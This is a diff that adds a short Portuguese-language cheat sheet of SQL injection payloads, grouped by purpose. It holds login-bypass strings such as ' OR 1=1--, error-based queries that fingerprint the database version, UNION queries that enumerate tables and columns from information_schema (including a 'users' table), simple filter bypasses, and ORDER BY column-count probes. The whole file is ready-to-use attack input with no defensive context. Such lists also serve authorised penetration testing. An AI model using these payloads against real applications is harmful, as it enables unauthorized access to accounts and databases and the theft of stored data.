@@ -1,0 +1,42 @@
+Testes Simples de Autenticação
+' OR 1=1--
+
+' OR 'a'='a
+
+admin' --
+
+admin' #
+
+admin'/*
+
+Testes de Erro (Forçando mensagens para identificar o DB)
+' AND 1=CONVERT(int, (SELECT @@version))--
+
+' AND 1=CAST(version() AS int)--
+
+') OR (SELECT 1 FROM dual WHERE database() LIKE '%') --
+
+
+Testes para enumeração de tabelas (MySQL)
+' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() --
+
+' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --
+
+Bypasses simples de filtros
+' OR '1'='1' /*
+
+' OR 1=1#
+
+' OR 'x'='x' --
+
+
+Outras variações úteis
+' UNION SELECT null, null, null--
+
+') UNION SELECT null, version(), user() --
+
+1' ORDER BY 1--
+
+1' ORDER BY 2--
+
+1' ORDER BY 3--
